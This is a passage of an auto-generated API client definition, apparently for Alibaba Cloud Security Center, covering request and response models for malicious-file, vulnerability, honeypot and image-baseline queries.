  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedMaliciousFiles(request: DescribeGroupedMaliciousFilesRequest): DescribeGroupedMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedMaliciousFilesWithOptions(request, runtime);
}

model DescribeGroupedTagsRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset to query. If you do not specify this parameter, the tags of all asset types are queried. Valid values:

*   **ecs**: server
*   **cloud_product**: Alibaba Cloud service', example='ecs'),
}

model DescribeGroupedTagsResponseBody = {
  count?: int32(name='Count', description='This parameter is deprecated.', example='0'),
  groupedFileds?: [ 
    {
      count?: string(name='Count', description='The number of assets to which the tag is added.', example='152'),
      name?: string(name='Name', description='The name of the tag.', example='InternetIp'),
      tagId?: int32(name='TagId', description='The ID of the tag.', example='3252366'),
    }
  ](name='GroupedFileds', description='An array that consists of the statistics of the asset tags.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code of the request.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: The request is successful.
*   **false**: The request fails.', example='true'),
}

model DescribeGroupedTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedTagsResponseBody(name='body'),
}

async function describeGroupedTagsWithOptions(request: DescribeGroupedTagsRequest, runtime: Util.RuntimeOptions): DescribeGroupedTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedTags(request: DescribeGroupedTagsRequest): DescribeGroupedTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedTagsWithOptions(request, runtime);
}

model DescribeGroupedVulRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2019:0230-Important: polkit security update'),
  attachTypes?: string(name='AttachTypes', description='The type of the vulnerability.

>  This parameter is valid only for application vulnerabilities and vulnerabilities that are detected based on software component analysis.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the vulnerability is handled. Valid values:

**y**: yes **n**: no', example='n'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='235454'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Separate multiple priorities with commas (,). Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='20'),
  searchTags?: string(name='SearchTags', description='The tag that is used to filter vulnerabilities. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='Code Execution'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).', example='d42f938c-d962-48a0-90f9-05e4ea****'),
}

model DescribeGroupedVulResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:0184-Important: mysql security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the **high** priority.', example='0'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the vulnerability was last detected. Unit: milliseconds.', example='1639371446000'),
      handledCount?: int32(name='HandledCount', description='The number of handled vulnerabilities.', example='0'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the **medium** priority.', example='0'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20170184'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the **low** priority.', example='59'),
      tags?: string(name='Tags', description='The tag that is added to the vulnerability. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='Code Execution'),
      totalFixCount?: long(name='TotalFixCount', description='The total number of fixed vulnerabilities.', example='0'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability
*   **cms**: Web-CMS vulnerability
*   **app**: application vulnerability
*   **emg**: urgent vulnerability
*   **sca**: vulnerability that is detected based on software component analysis', example='cve'),
    }
  ](name='GroupedVulItems', description='An array that consists of the vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 10.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9BFA6D78-07EA-5C0A-9358-E4434573507B'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeGroupedVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedVulResponseBody(name='body'),
}

async function describeGroupedVulWithOptions(request: DescribeGroupedVulRequest, runtime: Util.RuntimeOptions): DescribeGroupedVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedVul(request: DescribeGroupedVulRequest): DescribeGroupedVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedVulWithOptions(request, runtime);
}

model DescribeHcExportInfoRequest {
  exportId?: long(name='ExportId'),
}

model DescribeHcExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount'),
  fileName?: string(name='FileName'),
  gmtCreate?: long(name='GmtCreate'),
  id?: long(name='Id'),
  link?: string(name='Link'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  resultStatus?: string(name='ResultStatus'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeHcExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHcExportInfoResponseBody(name='body'),
}

async function describeHcExportInfoWithOptions(request: DescribeHcExportInfoRequest, runtime: Util.RuntimeOptions): DescribeHcExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHcExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHcExportInfo(request: DescribeHcExportInfoRequest): DescribeHcExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHcExportInfoWithOptions(request, runtime);
}

model DescribeHoneyPotAuthResponseBody = {
  honeyPotAuthCount?: long(name='HoneyPotAuthCount', description='The total quota.', example='10'),
  honeyPotCount?: int32(name='HoneyPotCount', description='The quota that is consumed.', example='4'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0F5023B6-9C1F-459F-ACCC-8B4636804037'),
}

model DescribeHoneyPotAuthResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotAuthResponseBody(name='body'),
}

async function describeHoneyPotAuthWithOptions(runtime: Util.RuntimeOptions): DescribeHoneyPotAuthResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotAuth',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotAuth(): DescribeHoneyPotAuthResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotAuthWithOptions(runtime);
}

model DescribeHoneyPotSuspStatisticsRequest {
  from?: string(name='From', description='The source of the request. Set the value to **honeypot**.', example='honeypot'),
  statisticsDays?: int32(name='StatisticsDays', description='The time range of the data to query. Unit: days.', example='30'),
  statisticsKeyType?: string(name='StatisticsKeyType', description='The type of the asset to query. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server', example='vpcInstanceId'),
}

model DescribeHoneyPotSuspStatisticsResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9E3969FA-5ACC-4256-9FDE-BB6918CD0410'),
  suspHoneyPotStatisticsResponse?: [ 
    {
      count?: int32(name='Count', description='The total number of alerts that are generated for the asset.', example='8793'),
      instanceId?: string(name='InstanceId', description='The ID of the server.

>  This parameter is returned only if **StatisticsKeyType** is set to **uuid**.', example='i-p0whhoba24wd28p8****'),
      instanceName?: string(name='InstanceName', description='The name of the server.

>  This parameter is returned only if **StatisticsKeyType** is set to **uuid**.', example='abc-launch-advisor'),
      type?: string(name='Type', description='The type of the asset. Valid values:

*   **vpcInstanceId**: VPC
*   **uuid**: server', example='vpcInstanceId'),
      vpcId?: string(name='VpcId', description='The ID of the VPC.

>  This parameter is returned only if **StatisticsKeyType** is set to **vpcInstanceId**.', example='vpc-p0wwdsuutdyu1ygkt****'),
      vpcName?: string(name='VpcName', description='The name of the VPC.

>  This parameter is returned only if **StatisticsKeyType** is set to **vpcInstanceId**.', example='abc01'),
    }
  ](name='SuspHoneyPotStatisticsResponse', description='An array consisting of the top 5 VPCs or assets for which alerts are most frequently generated.'),
}

model DescribeHoneyPotSuspStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotSuspStatisticsResponseBody(name='body'),
}

async function describeHoneyPotSuspStatisticsWithOptions(request: DescribeHoneyPotSuspStatisticsRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotSuspStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.statisticsDays)) {
    query['StatisticsDays'] = request.statisticsDays;
  }
  if (!Util.isUnset(request.statisticsKeyType)) {
    query['StatisticsKeyType'] = request.statisticsKeyType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotSuspStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotSuspStatistics(request: DescribeHoneyPotSuspStatisticsRequest): DescribeHoneyPotSuspStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotSuspStatisticsWithOptions(request, runtime);
}

model DescribeImageRequest {
  imageInstanceId?: string(name='ImageInstanceId', example='cri-hfs6gaawhyu6****'),
  imageRegionId?: string(name='ImageRegionId', example='cn-hangzhou'),
  imageRepoId?: string(name='ImageRepoId', example='crr-7i88t7lx3fmf****'),
  imageTag?: string(name='ImageTag', example='1.8.0.15'),
}

model DescribeImageResponseBody = {
  data?: {
    digest?: string(name='Digest', example='0afb98d97f1a4030782fcf47e186909e5ad957bcc182d8be70334e0684b2****'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageResponseBody(name='body'),
}

async function describeImageWithOptions(request: DescribeImageRequest, runtime: Util.RuntimeOptions): DescribeImageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageInstanceId)) {
    query['ImageInstanceId'] = request.imageInstanceId;
  }
  if (!Util.isUnset(request.imageRegionId)) {
    query['ImageRegionId'] = request.imageRegionId;
  }
  if (!Util.isUnset(request.imageRepoId)) {
    query['ImageRepoId'] = request.imageRepoId;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImage(request: DescribeImageRequest): DescribeImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageWithOptions(request, runtime);
}

model DescribeImageBaselineCheckResultRequest {
  criteria?: string(name='Criteria', example='ak_leak'),
  criteriaType?: string(name='CriteriaType', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', example='1'),
  imageUuid?: string(name='ImageUuid', example='a910053dd4710173ecc9e9d8931f****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  riskLevel?: string(name='RiskLevel', example='high,medium,low'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageBaselineCheckResultResponseBody = {
  baselineResult?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', example='identification'),
      baselineItemCount?: int32(name='BaselineItemCount', example='5'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey', example='identification'),
      baselineNameLevel?: string(name='BaselineNameLevel', example='high'),
      firstScanTime?: long(name='FirstScanTime', example='1610304058366'),
      highRiskItemCount?: int32(name='HighRiskItemCount', example='1'),
      lastScanTime?: long(name='LastScanTime', example='1610304058301'),
      lowRiskItemCount?: int32(name='LowRiskItemCount', example='10'),
      middleRiskItemCount?: int32(name='MiddleRiskItemCount', example='1'),
      status?: int32(name='Status', example='1'),
    }
  ](name='BaselineResult'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckResultResponseBody(name='body'),
}

async function describeImageBaselineCheckResultWithOptions(request: DescribeImageBaselineCheckResultRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckResult(request: DescribeImageBaselineCheckResultRequest): DescribeImageBaselineCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckResultWithOptions(request, runtime);
}

model DescribeImageBaselineCheckSummaryRequest {
  clusterId?: string(name='ClusterId'),
  criteria?: string(name='Criteria'),
  criteriaType?: string(name='CriteriaType'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskLevel?: string(name='RiskLevel'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageBaselineCheckSummaryResponseBody = {
  baselineResultSummary?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias'),
      baselineClassKey?: string(name='BaselineClassKey'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey'),
      baselineNameLevel?: string(name='BaselineNameLevel'),
      firstScanTime?: long(name='FirstScanTime'),
      highRiskImage?: int32(name='HighRiskImage'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskImage?: int32(name='LowRiskImage'),
      middleRiskImage?: int32(name='MiddleRiskImage'),
      status?: int32(name='Status'),
    }
  ](name='BaselineResultSummary'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageBaselineCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckSummaryResponseBody(name='body'),
}

async function describeImageBaselineCheckSummaryWithOptions(request: DescribeImageBaselineCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckSummary(request: DescribeImageBaselineCheckSummaryRequest): DescribeImageBaselineCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckSummaryWithOptions(request, runtime);
}

model DescribeImageBaselineDetailRequest {
  baselineItemKey?: string(name='BaselineItemKey'),
  imageUuid?: string(name='ImageUuid', example='06293273b67d19516cfcc712194f****'),
  lang?: string(name='Lang', example='zh'),
}

model DescribeImageBaselineDetailResponseBody = {
  baselineDetail?: {
    advice?: string(name='Advice'),
    baselineClassAlias?: string(name='BaselineClassAlias', example='ak_leak'),
    baselineItemAlias?: string(name='BaselineItemAlias'),
    baselineItemKey?: string(name='BaselineItemKey', example='ak_leak'),
    baselineNameAlias?: string(name='BaselineNameAlias'),
    description?: string(name='Description'),
    level?: string(name='Level', example='high'),
    prompt?: string(name='Prompt', example='/usr/aksk.txt:LTAI4GBEG5zaqX**********'),
    resultId?: string(name='ResultId', example='async__c6f3b0b54613383b40bdce593ffe****'),
  }(name='BaselineDetail'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeImageBaselineDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineDetailResponseBody(name='body'),
}

async function describeImageBaselineDetailWithOptions(request: DescribeImageBaselineDetailRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKey)) {
    query['BaselineItemKey'] = request.baselineItemKey;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineDetail(request: DescribeImageBaselineDetailRequest): DescribeImageBaselineDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineDetailWithOptions(request, runtime);
}

model DescribeImageBaselineItemListRequest {
  baselineClassKey?: string(name='BaselineClassKey', example='ak_leak'),
  baselineNameKey?: string(name='BaselineNameKey'),
  currentPage?: int32(name='CurrentPage', example='1'),
  imageUuid?: string(name='ImageUuid', example='0b5c7193300da2070220038718ad****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  scanRange?: [ string ](name='ScanRange'),
  status?: string(name='Status', example='0'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeImageBaselineItemListResponseBody = {
  baselineItemInfos?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias'),
      baselineClassKey?: string(name='BaselineClassKey', example='ak_leak'),
      baselineItemAlias?: string(name='BaselineItemAlias'),
      baselineItemKey?: string(name='BaselineItemKey', example='ak_leak'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey', example='ak_leak'),
      status?: int32(name='Status', example='0'),
      whiteList?: int32(name='WhiteList', example='0'),
    }
  ](name='BaselineItemInfos'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='253'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineItemListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineItemListResponseBody(name='body'),
}

async function describeImageBaselineItemListWithOptions(request: DescribeImageBaselineItemListRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineItemListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineClassKey)) {
    query['BaselineClassKey'] = request.baselineClassKey;
  }
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineItemList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineItemList(request: DescribeImageBaselineItemListRequest): DescribeImageBaselineItemListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineItemListWithOptions(request, runtime);
}

model DescribeImageBaselineStrategyRequest {
  lang?: string(name='Lang', example='zh'),
  strategyId?: long(name='StrategyId', example='8037'),
}

model DescribeImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', example='9F85AC10-A1FE-54D7-935A-F28D5256****'),
  strategy?: {
    baselineItemList?: [ 
      {
        classKey?: string(name='ClassKey', example='identification'),
        itemKey?: string(name='ItemKey', example='duplicate_pwd_hash'),
        nameKey?: string(name='NameKey', example='identification'),
      }
    ](name='BaselineItemList'),
    selectedItemCount?: int32(name='SelectedItemCount', example='10'),
    strategyId?: long(name='StrategyId', example='8257'),
    strategyName?: string(name='StrategyName', example='default'),
    totalItemCount?: int32(name='TotalItemCount', example='100'),
    type?: string(name='Type', example='default'),
  }(name='Strategy'),
}

model DescribeImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineStrategyResponseBody(name='body'),
}

async function describeImageBaselineStrategyWithOptions(request: DescribeImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineStrategy(request: DescribeImageBaselineStrategyRequest): DescribeImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineStrategyWithOptions(request, runtime);
}

model DescribeImageCriteriaRequest {
  value?: string(name='Value', example='525'),
}

model DescribeImageCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='vulStatus'),
      type?: string(name='Type', example='input'),
      values?: string(name='Values', example='NO,YES'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeImageCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageCriteriaResponseBody(name='body'),
}

async function describeImageCriteriaWithOptions(request: DescribeImageCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageCriteria(request: DescribeImageCriteriaRequest): DescribeImageCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageCriteriaWithOptions(request, runtime);
}

model DescribeImageFixTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  endTime?: long(name='EndTime', description='The timestamp when the task ends. Unit: milliseconds.', example='1635575219000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  startTime?: long(name='StartTime', description='The timestamp when the task starts. Unit: milliseconds.', example='1634725571000'),
  status?: string(name='Status', description='The status of the task. Valid values:

